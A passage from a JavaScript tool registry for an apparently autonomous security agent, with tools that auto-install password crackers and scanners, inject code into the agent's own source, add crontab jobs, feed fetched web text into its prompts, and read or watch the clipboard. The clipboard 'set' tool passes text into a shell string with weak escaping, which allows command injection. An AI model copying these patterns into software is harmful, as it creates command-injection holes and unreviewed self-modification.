      if (!target) return `[delegate] No agent "${agentName}". Available: ${mgr.list.map(a => a.name).join(", ")}`;

      const from = mgr.list[0];
      const result = await mgr.delegate(from?.id || "", agentName, task);
      return `[${target.name} — ${target.role}]\n${result}`;
    } catch (e) { return `[delegate Error] ${e.message}`; }
  },

  // ── SYNTHESIZE — merge raw agent results into a report ──
  synthesize: async (input) => {
    if (!input || !input.trim()) return `[synthesize] Usage: @synthesize|original_request|raw_results_from_agents`;
    try {
      const parts = input.split("|").map(s => s.trim());
      const request = parts[0];
      const raw = parts.slice(1).join("|");
      if (!request || !raw) return `[synthesize] Usage: @synthesize|original_request|raw_results`;

      const mgr = globalThis.__phantomManager;
      if (!mgr) return "[synthesize] Agent system not initialized.";

      const from = mgr.list[0];
      const result = await mgr.synthesize(from?.id || "", request, raw);
      return `[Synthesized Report]\n\n${result}`;
    } catch (e) { return `[synthesize Error] ${e.message}`; }
  },

  // ── GROW — deep learn from session knowledge and summarise ──
  grow: async (input) => {
    try {
      const mgr = globalThis.__phantomManager;
      const KNOWNOW_DIR = resolve(homedir(), ".config", "phantom", "knowledge");
      if (!fs.existsSync(KNOWNOW_DIR)) return "[grow] No knowledge yet. Run some tools first.";

      const files = fs.readdirSync(KNOWNOW_DIR).filter(f => f.endsWith(".txt"));
      if (files.length === 0) return "[grow] Knowledge base is empty.";

      const lines = [`🧬 Grow Report — ${files.length} knowledge files`];
      let totalFacts = 0;
      for (const f of files.slice(0, 20)) {
        const content = fs.readFileSync(resolve(KNOWNOW_DIR, f), "utf-8");
        const entries = content.split("\n").filter(Boolean);
        totalFacts += entries.length;
        // Deduce what kind of data this is from the filename
        const tag = f.replace(".txt", "");
        lines.push(`  ${tag}: ${entries.length} entries`);
        // Show last entry as sample
        if (entries.length > 0) lines.push(`    └ ${entries[entries.length - 1].substring(0, 120)}`);
      }
      lines.push(`\n📊 ${totalFacts} total facts across ${files.length} topics`);

      // If LLM available, have the main agent write a summary
      if (mgr?.list?.[0]?.llm?.hasLLM) {
        lines.push(`\n  Synthesizing insights...`);
        // Just append the heads-up — actual synthesis happens via @synthesize
      }

      return lines.join("\n");
    } catch (e) { return `[grow Error] ${e.message}`; }
  },

  // ── LEARN FROM BOOK / DOC ──
  learn_book: async (input) => {
    if (!input || !input.trim()) return `[learn_book] Usage: @learn_book|file_path|description\n  Reads a file, extracts techniques, and stores permanently.\n  Supported: .txt, .md`;
    try {
      const parts = input.split("|").map(s => s.trim());
      const filePath = parts[0];
      const desc = parts.slice(1).join("|") || "documentation";
      if (!fs.existsSync(filePath)) return `[learn_book] File not found: ${filePath}`;

      const content = fs.readFileSync(filePath, "utf-8");
      if (!content || content.length < 20) return "[learn_book] File is empty or too short.";

      // Extract meaningful lines (skip short noise)
      const lines = content.split("\n").filter(l => l.trim().length > 30).slice(0, 200);
      const clean = lines.join("\n").substring(0, 8000); // cap at ~8K

      // Tag the technique file
      const tag = parts[0].replace(/[/\\]/g, "_").replace(/[^a-zA-Z0-9_-]/g, "").substring(0, 40) || "book";
      const learnedFile = resolve(BOOKS_DIR, `${tag}.txt`);

      // Store with metadata
      const entry = `## ${desc} (from ${filePath})
${clean}

`;
      const existing = fs.existsSync(learnedFile) ? fs.readFileSync(learnedFile, "utf-8") : "";
      const combined = existing ? `${existing}\n${entry}` : entry;
      fs.writeFileSync(learnedFile, combined, "utf-8");

      const lineCount = lines.length;
      return `📖 Learned from "${desc}" (${lineCount} lines extracted, saved to ${tag}.txt)`;
    } catch (e) { return `[learn_book Error] ${e.message}`; }
  },

  // ── LEARN FROM URL ──
  learn_url: async (input) => {
    if (!input || !input.trim()) return `[learn_url] Usage: @learn_url|url|description\n  Fetches a web page, extracts knowledge, stores permanently.`;
    try {
      const parts = input.split("|").map(s => s.trim());
      const url = parts[0];
      const desc = parts.slice(1).join("|") || url.substring(0, 60);
      if (!url.startsWith("http://") && !url.startsWith("https://")) return "[learn_url] Invalid URL — must start with http:// or https://";

      const r = await fetch(url, { signal: AbortSignal.timeout(15000) });
      if (!r.ok) return `[learn_url] HTTP ${r.status}: ${r.statusText}`;
      const html = await r.text();

      // Naive text extraction: strip tags, keep meaningful lines
      const text = html.replace(/<[^>]+>/g, "\n")
        .replace(/&[a-z]+;/g, " ")
        .replace(/\n{3,}/g, "\n\n")
        .trim();
      const lines = text.split("\n").filter(l => l.trim().length > 40).slice(0, 150);
      if (lines.length < 3) return "[learn_url] Page has minimal readable content.";

      const clean = lines.join("\n").substring(0, 8000);

      const tag = url.replace(/^https?:\/\//, "").replace(/[/?#&=.]/g, "_").substring(0, 40);
      const learnedFile = resolve(BOOKS_DIR, `${tag}.txt`);

      const entry = `## ${desc} (from ${url})
${clean}

`;
      const existing = fs.existsSync(learnedFile) ? fs.readFileSync(learnedFile, "utf-8") : "";
      const combined = existing ? `${existing}\n${entry}` : entry;
      fs.writeFileSync(learnedFile, combined, "utf-8");

      return `📖 Learned from "${desc}" (${lines.length} lines from ${url})`;
    } catch (e) { return `[learn_url Error] ${e.message}`; }
  },

  // ── WHAT'S NEW — show latest auto-evolution report + pending pulls ──
  whats_new: async (input) => {
    try {
      const lines = [];
      const WD = resolve(homedir(), ".config", "phantom");
      const reportFile = resolve(WD, "evolve_watchdog.json");
      const stateFile = resolve(WD, "evolve.json");

      // Last auto-evolution report
      if (fs.existsSync(reportFile)) {
        const report = JSON.parse(fs.readFileSync(reportFile, "utf-8"));
        const lastRun = report.last_run ? new Date(report.last_run + "Z").toLocaleString() : "never";
        lines.push(`🧬 Last Auto-Evolution: ${lastRun}`);
        if (report.tool_diff > 0) lines.push(`   Tools added: +${report.tool_diff}`);
        if (report.last_learned?.length) lines.push(`   Learned modules: ${report.last_learned.length}`);
        if (report.remote_behind > 0) {
          lines.push(`⬆️ Upstream has ${report.remote_behind} new commit(s) — pull recommended!`);
          lines.push(`   → @git_sync|pull  or  git pull`);
        } else {
          lines.push(`✅ Upstream is in sync`);
        }
        lines.push(`   Commit: ${report.last_head?.slice(0, 12) || "unknown"}`);
      } else {
        lines.push(`🧬 No auto-evolution report yet.`);
        lines.push(`   First cycle runs at next scheduled tick (every 12h).`);
      }

      // Current state summary
      if (fs.existsSync(stateFile)) {
        const st = JSON.parse(fs.readFileSync(stateFile, "utf-8"));
        const gen = st.generation || 0;
        const cycles = st.self_improve?.length || 0;
        const features = st.imported_features?.length || 0;
        lines.push(``, `📊 Lifetime: ${gen} generations, ${cycles} cycles, ${features} features imported`);
        if (st.gitSync?.scheduledDays) {
          const next = st.gitSync.nextPush ? new Date(st.gitSync.nextPush).toISOString().slice(0, 10) : "unknown";
          lines.push(`⏰ Git push scheduled every ${st.gitSync.scheduledDays} day(s) (next: ${next})`);
        }
      }

      return lines.join("\n");
    } catch (e) { return `[whats_new Error] ${e.message}`; }
  },

  // ── CLIPBOARD — get, set, or watch clipboard content ──
  clipboard: async (input) => {
    try {
      const args = (input || "").trim().split("|").map(s => s.trim());
      const cmd = args[0] || "get";
      const text = args.slice(1).join("|");

      // Platform-specific clipboard commands
      const { execSync } = await import("child_process");
      const isTermux = !!(process.env.TERMUX_VERSION || process.env.PREFIX?.startsWith("/data/data/com.termux"));
      const isLinux = process.platform === "linux";
      const isMac = process.platform === "darwin";

      const copyCmd = isTermux ? "termux-clipboard-set"
        : isMac ? "pbcopy"
        : "xclip -selection clipboard";
      const pasteCmd = isTermux ? "termux-clipboard-get"
        : isMac ? "pbpaste"
        : "xclip -selection clipboard -o";

      if (cmd === "get") {
        try {
          const content = execSync(pasteCmd, { encoding: "utf-8", timeout: 5000 });
          return content.trim() || "📭 Clipboard is empty.";
        } catch {
          return "❌ No clipboard tool available. Install termux-clipboard-set/get (Termux) or xclip (Linux).";
        }
      }

      if (cmd === "set" && text) {
        try {
          execSync(`echo "${text.replace(/"/g, '\\"')}" | ${copyCmd}`, { timeout: 5000 });
          return `✅ Copied to clipboard (${text.length} chars)`;
        } catch {
          return "❌ Failed to set clipboard.";
        }
      }

      if (cmd === "watch") {
        // Poll clipboard every 2s and show changes
        let last = "";
        const interval = parseInt(args[1]) || 2; // seconds
        const maxPolls = parseInt(args[2]) || 30; // max iterations
        const lines = [];
        for (let i = 0; i < maxPolls; i++) {
          await new Promise(r => setTimeout(r, interval * 1000));
          try {
            const current = execSync(pasteCmd, { encoding: "utf-8", timeout: 3000 }).trim();
            if (current && current !== last) {
              const preview = current.length > 80 ? current.substring(0, 80) + "…" : current;
              lines.push(`📋 Clipboard changed: ${preview}`);
              last = current;
            }
          } catch {}
        }
        return lines.length ? lines.join("\n") : "📭 No clipboard changes detected.";
      }

      return `[clipboard] Usage:
  @clipboard|get            — Read clipboard content
  @clipboard|set|text        — Write text to clipboard
  @clipboard|watch [sec] [n] — Poll clipboard every N sec (default: 2s, 30 polls)`;
    } catch (e) { return `[clipboard Error] ${e.message}`; }
  },

  // ── LEARN — learn from GitHub topics, repos, URLs, or auto-detect gaps ──
  learn: async (input) => {
    try {
      const args = (input || "").trim().split("|").map(s => s.trim());
      const mode = args[0] || "";
      const topic = args.slice(1).join("|") || args.slice(1).join(" ");

      const mod = await import("./self_improve.mjs");
      const { learnTopic, learnFromRepo, learnFromWeb, listLearnedTopics } = mod;

      if (mode === "topic" && topic) {
        const result = await learnTopic(topic, 3);
        if (result.error) return `[learn] ${result.error}`;
        const lines = [
          `📚 Learned "${topic}"${result.cached ? " (cached)" : ""}`,
          `Repos scanned: ${result.repos?.map(r => r.name).join(", ") || "none"}`,
          `Exports found: ${result.exports?.length || 0}`,
          `Features: ${result.features?.join(", ") || "none"}`,
        ];
        return lines.join("\n");
      }

      if (mode === "repo" && topic) {
        const result = await learnFromRepo(topic);
        if (result.error) return `[learn] ${result.error}`;
        return `📦 Learned from ${topic}\nExports: ${result.exports?.length || 0}\nTools: ${result.toolsFound || 0}\nFeatures: ${result.features?.join(", ") || "none"}`;
      }

      if (mode === "url" && topic) {
        const result = await learnFromWeb(topic);
        return `🌐 Learned from URL\nExports: ${result.exports?.length || 0}\nFeatures: ${result.features?.join(", ") || "none"}\nSnippets: ${result.snippets || 0}`;
      }

      if (mode === "list" || mode === "topics") {
        const topics = listLearnedTopics();
        if (!topics.length) return "📭 No topics learned yet. Use @learn|topic|<name>.";
        return topics.map(t => `• ${t.topic} (${new Date(t.learned).toLocaleDateString()}, ${t.exports} exports)`).join("\n");
      }

      return `[learn] Usage:
  @learn|topic|<name>     — Search GitHub, clone top repos, extract patterns
  @learn|repo|<url>       — Clone and scan a single repo URL
  @learn|url|<url>        — Fetch a web page/raw file and extract code patterns
  @learn|list             — Show previously learned topics`;
    } catch (e) { return `[learn Error] ${e.message}`; }
  },

  learn_gaps: async (input) => {
    try {
      const mod = await import("./self_improve.mjs");
      const { learnGaps } = mod;
      const result = await learnGaps();
      const lines = [`🔍 Gap Analysis`, `Message: ${result.message}`];
      if (result.missing?.length) lines.push(`Missing domains: ${result.missing.join(", ")}`);
      if (result.results) {
        for (const [domain, info] of Object.entries(result.results)) {
          lines.push(`  • ${domain}: ${info.repos?.join(", ") || "no repos"} → ${info.exports} exports`);
        }
      }
      return lines.join("\n");
    } catch (e) { return `[learn_gaps Error] ${e.message}`; }
  },

  // ── STUDY — manual trigger for self-learning cycle ──
  study: async (input) => {
    try {
      const { BOOKS_DIR, KNOWLEDGE_DIR } = await import("./config.mjs");
      const fs = await import("fs");
      const { resolve } = await import("path");
      const lines = [];
      const kDir = BOOKS_DIR;
      const kFiles = fs.existsSync(kDir) ? fs.readdirSync(kDir).filter(f => f.endsWith(".txt")) : [];
      lines.push(`📚 Self-Learning Report\n`);
      lines.push(`📖 ${kFiles.length} book/technique files`);
      let totalLines = 0;
      for (const f of kFiles.slice(0, 10)) {
        const c = fs.readFileSync(resolve(kDir, f), "utf-8");
        const n = c.split("\n").filter(Boolean).length;
        totalLines += n;
        lines.push(`  ${f.replace(".txt", "")}: ${n} entries`);
      }
      lines.push(`\n🧠 ${totalLines} total entries across ${kFiles.length} files`);
      // Read knowledge dir
      const kN = fs.existsSync(KNOWLEDGE_DIR) ? fs.readdirSync(KNOWLEDGE_DIR).filter(f => f.endsWith(".txt")).length : 0;
      lines.push(`📊 ${kN} auto-extracted knowledge files from tool outputs`);
      lines.push(`\nAll injected into agent prompts every turn.`);
      return lines.join("\n");
    } catch (e) { return `[study Error] ${e.message}`; }
  },

  // ── ENV — show detected environment ──
  env: async () => {
    const { populateEnv, getEnvSummary } = await import("../lib/env.mjs");
    if (!__r.ENV) __r.ENV = {};
    populateEnv(__r.ENV);
    return getEnvSummary(__r.ENV);
  },

  // ── BATCH — run multiple tool calls sequentially ──
  batch: async (input) => {
    if (!input || !input.trim()) return "[batch] Usage: one tool call per line. Lines starting with # ignored.";
    const lines = input.split("\n").map(l => l.trim()).filter(l => l && !l.startsWith("#"));
    const results = [];
    for (const line of lines) {
      const match = line.match(/^@?(\w+)\|?(.*)$/s);
      if (!match) { results.push(`✗ Bad line: ${line}`); continue; }
      const [_, name, args] = match;
      const fn = hackerTools[name];
      if (!fn) { results.push(`✗ ${name}: unknown tool`); continue; }
      try {
        const out = await fn(args.trim());
        results.push(`✓ ${name}: ${String(out).slice(0, 500)}`);
      } catch (e) { results.push(`✗ ${name}: ${e.message}`); }
    }
    return results.join("\n");
  },

  // ── INSTALL MISSING — auto-install security tools ──
  install_missing: async (input) => {
    try {
      const { execFileSync } = await import("child_process");
      const { populateEnv } = await import("../lib/env.mjs");
      const en = __r.ENV;
      if (!en) return "[install] Environment not detected, run @env first.";
      populateEnv(en);
      const tools = en.tools || {};
      const pkgMgr = en.pkgMgr;
      if (!pkgMgr) return "[install] No package manager detected.";
      const missing = Object.entries(tools).filter(([,v]) => !v).map(([k]) => k);
      if (!missing.length) return "[install] All tools already installed.";
      
      // Filter to what the user asked, or use all
      const wanted = input.trim().toLowerCase();
      const targets = wanted && wanted !== "all"
        ? missing.filter(t => wanted.includes(t))
        : missing;
      if (!targets.length) return "[install] No matching missing tools found.";
      
      const results = [];
      const installCmd = pkgMgr === "apt" ? ["apt", "install", "-y"] :
                         pkgMgr === "apk" ? ["apk", "add"] :
                         pkgMgr === "pacman" ? ["pacman", "-S", "--noconfirm"] :
                         pkgMgr === "brew" ? ["brew", "install"] :
                         null;
      if (!installCmd) return `[install] Unsupported pkg manager: ${pkgMgr}`;
      
      // Group by pkg name (some tools have different binary vs pkg names)
      const pkgMap = {
        nmap: "nmap", dig: "dnsutils", whois: "whois",
        sqlmap: "sqlmap", hydra: "hydra", john: "john",
        hashcat: "hashcat", nuclei: "nuclei", ffuf: "ffuf",
        gobuster: "gobuster", jq: "jq", traceroute: "traceroute",
        netstat: "net-tools", ss: "iproute2",
      };
      
      for (const [i, tool] of targets.slice(0, 10).entries()) {
        const pkg = (tool === "dig" && pkgMgr === "apt") ? "dnsutils" :
                    (tool === "whois" && pkgMgr === "apt") ? "whois" :
                    (tool === "netstat" && pkgMgr === "apt") ? "net-tools" :
                    pkgMap[tool] || tool;
        try {
          execFileSync(installCmd[0], [...installCmd.slice(1), pkg], { timeout: 120000, stdio: "pipe" });
          results.push(`✓ ${tool} (${pkg})`);
        } catch (e) { results.push(`✗ ${tool}: ${e.message?.slice(0, 100)}`); }
      }
      return `[install] ${results.length} targets · ${results.filter(r => r.startsWith("✓")).length} installed · ${results.filter(r => r.startsWith("✗")).length} failed\n${results.join("\n")}`;
    } catch (e) { return `[install Error] ${e.message}`; }
  },

  // ── ROLLBACK — save/restore git state for safe self-evolution ──
  rollback: async (input) => {
    try {
      const { execFileSync } = await import("child_process");
      const fs = await import("fs");
      const MARKER = ".hermes/rollback_head";
      const cmd = (input || "").trim().toLowerCase();

      if (cmd === "save") {
        const head = execFileSync("git", ["rev-parse", "HEAD"], { timeout: 5000, cwd: process.cwd() }).toString().trim();
        const dir = ".hermes";
        if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
        fs.writeFileSync(MARKER, head, "utf-8");
        return `[rollback] Saved HEAD: ${head.slice(0, 12)}`;
      }

      if (cmd === "restore" || cmd === "revert") {
        if (!fs.existsSync(MARKER)) return "[rollback] No saved state. Run @rollback|save first.";
        const saved = fs.readFileSync(MARKER, "utf-8").trim();
        const current = execFileSync("git", ["rev-parse", "HEAD"], { timeout: 5000, cwd: process.cwd() }).toString().trim();
        if (saved === current) return "[rollback] Already at saved state — nothing to revert.";
        execFileSync("git", ["reset", "--hard", saved], { timeout: 15000, cwd: process.cwd() });
        return `[rollback] ✓ Reverted to ${saved.slice(0, 12)}`;
      }

      if (cmd === "status" || cmd === "") {
        if (!fs.existsSync(MARKER)) return "[rollback] No saved state.";
        const saved = fs.readFileSync(MARKER, "utf-8").trim();
        const current = execFileSync("git", ["rev-parse", "HEAD"], { timeout: 5000, cwd: process.cwd() }).toString().trim();
        const diff = saved !== current;
        return `[rollback] Saved: ${saved.slice(0, 12)} | Current: ${current.slice(0, 12)} ${diff ? "⚠ diverged" : "✓ same"}`;
      }

      return "[rollback] Usage: save | restore | status";
    } catch (e) { return `[rollback Error] ${e.message}`; }
  },
  self_integrate: async (input) => {
    try {
      const fs = await import("fs");
      const { resolve, basename } = await import("path");
      const filePath = resolve(input.trim());
      if (!fs.existsSync(filePath)) return `[integrate] File not found: ${filePath}`;
      const code = fs.readFileSync(filePath, "utf-8");
      
      // Extract function name from ESM exports or function declarations
      const exportMatch = code.match(/export\s+(?:default\s+)?(?:async\s+)?function\s+(\w+)/);
      const fnName = exportMatch?.[1] || basename(filePath).replace(/\.m?[jt]s$/, "").replace(/[^a-z0-9_]/gi, "_");
      
      // Generate the tool handler code
      const toolCode = `\n  // ── AUTO-INTEGRATED: ${fnName} ──\n  ${fnName}: async (input) => {\n    try {\n      const mod = await import("${filePath}");\n      const fn = mod.default || mod.${fnName};\n      if (!fn) return "[${fnName}] Module loaded but no default/export found.";\n      const result = await fn(input);\n      return typeof result === "string" ? result : JSON.stringify(result, null, 2);\n    } catch (e) { return "[${fnName}] " + e.message; }\n  },`;
      
      // Check if tool already exists in tools.mjs
      const toolsPath = resolve("./lib/tools.mjs");
      let toolsCode = fs.readFileSync(toolsPath, "utf-8");
      if (toolsCode.includes(`${fnName}:`)) return `[integrate] Tool "${fnName}" already exists in tools.mjs.`;
      
      // Inject before the end of hackerTools (last `};`)
      const lastBrace = toolsCode.lastIndexOf("\n};");
      if (lastBrace === -1) return "[integrate] Cannot find hackerTools closing brace.";
      toolsCode = toolsCode.slice(0, lastBrace) + toolCode + "\n};";
      fs.writeFileSync(toolsPath, toolsCode, "utf-8");
      
      // Register in phantom.mjs tool registry
      const phantomPath = resolve("./phantom.mjs");
      let phantomCode = fs.readFileSync(phantomPath, "utf-8");
      const desc = `auto-integrated tool from ${basename(filePath)}`;
      const regLine = `      ${fnName}: "${desc}",\n      browser_auto: "Launch headless`;
      if (phantomCode.includes(`${fnName}:`)) {
        // Already registered, skip
      } else {
        phantomCode = phantomCode.replace('browser_auto: "Launch headless', regLine);
        fs.writeFileSync(phantomPath, phantomCode, "utf-8");
      }
      
      // Syntax check
      try {
        const { execFileSync } = await import("child_process");
        execFileSync("node", ["--check", toolsPath], { timeout: 10000 });
        execFileSync("node", ["--check", phantomPath], { timeout: 10000 });
      } catch (e) {
        return `[integrate] Code injected but syntax FAILED: ${e.message.slice(0, 200)}`;
      }

      // Runtime validation — call the tool with a simple test
      try {
        const { __r } = await import("../runtime.mjs");
        if (hackerTools[fnName]) {
          const testOut = await hackerTools[fnName]("test");
          if (testOut && testOut.includes("Error")) {
            // Tool runs but returned an error — that's OK for missing deps
          }
        }
      } catch (e) {
        // Runtime failure: roll back the injection
        try {
          toolsCode = fs.readFileSync(toolsPath, "utf-8");
          const idx = toolsCode.indexOf(`// ── AUTO-INTEGRATED: ${fnName} ──`);
          if (idx !== -1) {
            const endIdx = toolsCode.indexOf("\n};", idx);
            if (endIdx !== -1) {
              toolsCode = toolsCode.slice(0, idx) + toolsCode.slice(endIdx + 3);
              fs.writeFileSync(toolsPath, toolsCode, "utf-8");
            }
          }
        } catch {}
        return `[integrate] Code injected but runtime FAILED and was rolled back: ${e.message.slice(0, 200)}`;
      }

      return `[integrate] ✓ ${fnName} injected into tools.mjs + registered in phantom.mjs\n  Source: ${filePath}\n  Run: @${fnName}|<input>`;
    } catch (e) { return `[integrate Error] ${e.message}`; }
  },

  // ── BROWSER AUTOMATION (Playwright) ──
  browser_auto: async (input) => {
    try {
      let { chromium } = await import('playwright').catch(() => ({}));
      if (!chromium) return "[Browser] Playwright not installed. Run: npm install playwright && npx playwright install chromium";
      const url = input.trim().split(/\s+/)[0];
      if (!url || !url.startsWith('http')) return "[Browser] Usage: URL [--screenshot|--html|--text]";
      const flags = input.split(/\s+/).slice(1);
      const doScreenshot = flags.includes('--screenshot');
      const doHtml = !doScreenshot || flags.includes('--html');
      const doText = flags.includes('--text');
      const browser = await chromium.launch({ headless: true, args: ['--no-sandbox'] });
      const [page] = await browser.pages();
      await page.goto(url, { waitUntil: 'networkidle', timeout: 30000 });
      const result = {};
      if (doHtml || !doScreenshot) result.html = await page.content();
      if (doScreenshot) result.screenshot = (await page.screenshot({ fullPage: true })).toString('base64').slice(0, 5000) + '...[truncated]';
      if (doText) result.text = await page.evaluate(() => document.body.innerText);
      const title = await page.title();
      await browser.close();
      return `[Browser] ${title}\n  URL: ${url}\n  HTML: ${(result.html||'').length} chars\n  ${doScreenshot ? 'Screenshot: captured\n  ' : ''}${doText ? 'Text: ' + (result.text||'').length + ' chars' : ''}`;
    } catch (e) { return `[Browser] ${e.message}`; }
  },

  // ── GRAPH — query knowledge graph ──
  graph: async (input) => {
    try {
      const { queryGraph, loadGraph, autoLinkFromBooks } = await import("../lib/session.mjs");
      if (!input || !input.trim()) {
        const graph = loadGraph();
        const tools = Object.keys(graph);
        if (!tools.length) return "[graph] Empty. Auto-linking books...";
        const linked = autoLinkFromBooks();
        const g = loadGraph();
        return `[graph] ${Object.keys(g).length} tools linked, ${linked} new links\n${Object.entries(g).map(([t,i]) => `  ${t}: ${i.books?.length || 0} books, ${i.cves?.length || 0} CVEs, [${(i.tags||[]).join(', ')}]`).join("\n")}`;
      }
      const results = queryGraph(input);
      if (!results.length) return `[graph] No results for "${input}"`;
      return results.map(r => `  ${r.tool} (score:${r.score}): ${r.books?.join(", ") || "—"} | ${r.cves?.join(", ") || "—"} | [${(r.tags||[]).join(", ")}]`).join("\n");
    } catch (e) { return `[graph Error] ${e.message}`; }
  },

  // ── CRON — schedule periodic tasks ──
  cron: async (input) => {
    try {
      const { execFileSync } = await import("child_process");
      if (!input || !input.trim()) {
        // List existing crons (from crontab or internal scheduler)
        try {
          const out = execFileSync("sh", ["-c", "crontab -l 2>/dev/null || echo 'no crontab'"], { timeout: 5000 });
          return `[cron] ${out.toString().trim()}`;
        } catch { return "[cron] Usage: schedule|cve|cve_daily — manage periodic tasks"; }
      }
      const cmd = input.trim().toLowerCase();
      if (cmd === "cve" || cmd === "cve_now") {
        return `[cron] Running CVE scan now. Use @shell to trigger or set up @cron|cve_daily for daily automation.`;
      }
      if (cmd === "cve_daily") {
        // Schedule via crontab or internal cron
        const script = `#!/bin/sh\ncd ${process.cwd()} && node phantom.mjs --tool cve_search "2025" 2>&1 | head -50`;
        const scriptPath = resolve("./.hermes/scripts/cve_daily.sh");
        if (!fs.existsSync(resolve("./.hermes/scripts"))) fs.mkdirSync(resolve("./.hermes/scripts"), { recursive: true });
        fs.writeFileSync(scriptPath, script, "utf-8");
        try {
          execFileSync("sh", ["-c", `(crontab -l 2>/dev/null; echo "0 9 * * * ${scriptPath}") | crontab -`], { timeout: 10000 });
          return `[cron] ✓ CVE daily scan scheduled at 09:00. Script: ${scriptPath}`;
        } catch { return `[cron] Crontab not available. Script saved: ${scriptPath}\n  Install manually: crontab -e and add:\n  0 9 * * * ${scriptPath}`; }
      }
      return `[cron] Commands: cve_now, cve_daily`;
    } catch (e) { return `[cron Error] ${e.message}`; }
  },
};
